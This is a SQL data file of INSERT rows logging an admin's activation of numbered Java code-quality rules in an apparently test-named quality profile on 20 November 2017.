INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3014, '2017-11-20 12:20:17.42', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S135;ruleKey=squid:S135;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzmMbbGRdfPp-rMq');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3015, '2017-11-20 12:20:17.449', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1444;ruleKey=squid:S1444;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzmpbbGRdfPp-rMr');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3016, '2017-11-20 12:20:17.485', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1450;ruleKey=squid:S1450;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXznNbbGRdfPp-rMs');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3017, '2017-11-20 12:20:17.54', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1452;ruleKey=squid:S1452;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzoEbbGRdfPp-rMt');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3018, '2017-11-20 12:20:17.611', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1479;ruleKey=squid:S1479;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;param_maximum=30;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzpLbbGRdfPp-rMu');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3019, '2017-11-20 12:20:17.668', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1481;ruleKey=squid:S1481;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzqEbbGRdfPp-rMv');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3020, '2017-11-20 12:20:17.725', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1488;ruleKey=squid:S1488;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzq9bbGRdfPp-rMw');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3021, '2017-11-20 12:20:17.804', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1596;ruleKey=squid:S1596;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzsMbbGRdfPp-rMx');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3022, '2017-11-20 12:20:17.851', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1598;ruleKey=squid:S1598;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzs7bbGRdfPp-rMy');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3023, '2017-11-20 12:20:17.886', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1602;ruleKey=squid:S1602;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXztebbGRdfPp-rMz');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3024, '2017-11-20 12:20:17.911', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1604;ruleKey=squid:S1604;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzt3bbGRdfPp-rM0');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3025, '2017-11-20 12:20:17.966', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1607;ruleKey=squid:S1607;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzuubbGRdfPp-rM1');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3026, '2017-11-20 12:20:18.004', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1610;ruleKey=squid:S1610;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzvUbbGRdfPp-rM2');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3027, '2017-11-20 12:20:18.04', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1611;ruleKey=squid:S1611;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzv4bbGRdfPp-rM3');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3028, '2017-11-20 12:20:18.067', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1612;ruleKey=squid:S1612;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzwTbbGRdfPp-rM4');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3029, '2017-11-20 12:20:18.107', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1640;ruleKey=squid:S1640;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzw7bbGRdfPp-rM5');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3030, '2017-11-20 12:20:18.141', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1643;ruleKey=squid:S1643;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzxdbbGRdfPp-rM6');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3031, '2017-11-20 12:20:18.167', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1656;ruleKey=squid:S1656;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzx3bbGRdfPp-rM7');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3032, '2017-11-20 12:20:18.19', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1659;ruleKey=squid:S1659;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzyObbGRdfPp-rM8');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3033, '2017-11-20 12:20:18.235', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1700;ruleKey=squid:S1700;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzy7bbGRdfPp-rM9');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3034, '2017-11-20 12:20:18.273', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1710;ruleKey=squid:S1710;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzzhbbGRdfPp-rM-');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3035, '2017-11-20 12:20:18.326', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1751;ruleKey=squid:S1751;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXz0WbbGRdfPp-rM_');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3036, '2017-11-20 12:20:18.363', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1764;ruleKey=squid:S1764;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXz07bbGRdfPp-rNA');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3037, '2017-11-20 12:20:18.401', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1844;ruleKey=squid:S1844;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXz1hbbGRdfPp-rNB');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3038, '2017-11-20 12:20:18.45', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1845;ruleKey=squid:S1845;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXz2SbbGRdfPp-rNC');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3039, '2017-11-20 12:20:18.496', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1849;ruleKey=squid:S1849;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXz3AbbGRdfPp-rND');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3040, '2017-11-20 12:20:18.547', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1854;ruleKey=squid:S1854;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXz3zbbGRdfPp-rNE');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3041, '2017-11-20 12:20:18.605', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1858;ruleKey=squid:S1858;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXz4tbbGRdfPp-rNF');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3042, '2017-11-20 12:20:18.668', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1860;ruleKey=squid:S1860;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXz5sbbGRdfPp-rNG');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3043, '2017-11-20 12:20:18.75', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1862;ruleKey=squid:S1862;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXz6-bbGRdfPp-rNH');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3044, '2017-11-20 12:20:18.8', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1871;ruleKey=squid:S1871;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXz7wbbGRdfPp-rNI');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3045, '2017-11-20 12:20:18.874', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1872;ruleKey=squid:S1872;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXz86bbGRdfPp-rNJ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3046, '2017-11-20 12:20:18.924', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1905;ruleKey=squid:S1905;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXz9sbbGRdfPp-rNK');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3047, '2017-11-20 12:20:18.955', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1940;ruleKey=squid:S1940;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXz-LbbGRdfPp-rNL');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3048, '2017-11-20 12:20:19', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1948;ruleKey=squid:S1948;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXz-4bbGRdfPp-rNM');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3049, '2017-11-20 12:20:19.048', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1989;ruleKey=squid:S1989;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXz_obbGRdfPp-rNN');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3050, '2017-11-20 12:20:19.097', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S1994;ruleKey=squid:S1994;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0AZbbGRdfPp-rNO');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3051, '2017-11-20 12:20:19.142', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2055;ruleKey=squid:S2055;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0BGbbGRdfPp-rNP');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3052, '2017-11-20 12:20:19.173', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2060;ruleKey=squid:S2060;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0BlbbGRdfPp-rNQ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3053, '2017-11-20 12:20:19.223', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2061;ruleKey=squid:S2061;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0CXbbGRdfPp-rNR');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3054, '2017-11-20 12:20:19.262', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2062;ruleKey=squid:S2062;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0C-bbGRdfPp-rNS');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3055, '2017-11-20 12:20:19.302', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2065;ruleKey=squid:S2065;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0DmbbGRdfPp-rNT');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3056, '2017-11-20 12:20:19.332', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2066;ruleKey=squid:S2066;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0EEbbGRdfPp-rNU');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3057, '2017-11-20 12:20:19.368', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2068;ruleKey=squid:S2068;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0EobbGRdfPp-rNV');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3058, '2017-11-20 12:20:19.411', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2077;ruleKey=squid:S2077;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0FTbbGRdfPp-rNW');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3059, '2017-11-20 12:20:19.463', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2092;ruleKey=squid:S2092;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0GHbbGRdfPp-rNX');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3060, '2017-11-20 12:20:19.501', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2093;ruleKey=squid:S2093;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0GtbbGRdfPp-rNY');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3061, '2017-11-20 12:20:19.584', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2094;ruleKey=squid:S2094;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0IAbbGRdfPp-rNZ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3062, '2017-11-20 12:20:19.626', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2095;ruleKey=squid:S2095;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;param_excludedResourceTypes=;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0IqbbGRdfPp-rNa');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3063, '2017-11-20 12:20:19.671', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2097;ruleKey=squid:S2097;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0JXbbGRdfPp-rNb');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3064, '2017-11-20 12:20:19.722', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2109;ruleKey=squid:S2109;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0KKbbGRdfPp-rNc');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3065, '2017-11-20 12:20:19.745', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2110;ruleKey=squid:S2110;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0KhbbGRdfPp-rNd');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3066, '2017-11-20 12:20:19.766', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2111;ruleKey=squid:S2111;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0K2bbGRdfPp-rNe');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3067, '2017-11-20 12:20:19.789', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2112;ruleKey=squid:S2112;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0LMbbGRdfPp-rNf');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3068, '2017-11-20 12:20:19.82', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2114;ruleKey=squid:S2114;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0LsbbGRdfPp-rNg');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3069, '2017-11-20 12:20:19.858', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2116;ruleKey=squid:S2116;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0MSbbGRdfPp-rNh');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3070, '2017-11-20 12:20:19.897', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2118;ruleKey=squid:S2118;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0M5bbGRdfPp-rNi');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3071, '2017-11-20 12:20:19.927', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2122;ruleKey=squid:S2122;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0NXbbGRdfPp-rNj');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3072, '2017-11-20 12:20:19.964', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2123;ruleKey=squid:S2123;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0N8bbGRdfPp-rNk');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3073, '2017-11-20 12:20:19.999', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2127;ruleKey=squid:S2127;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0OfbbGRdfPp-rNl');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3074, '2017-11-20 12:20:20.022', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2129;ruleKey=squid:S2129;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0O2bbGRdfPp-rNm');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3075, '2017-11-20 12:20:20.057', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2130;ruleKey=squid:S2130;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0PZbbGRdfPp-rNn');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3076, '2017-11-20 12:20:20.091', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2131;ruleKey=squid:S2131;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0P7bbGRdfPp-rNo');
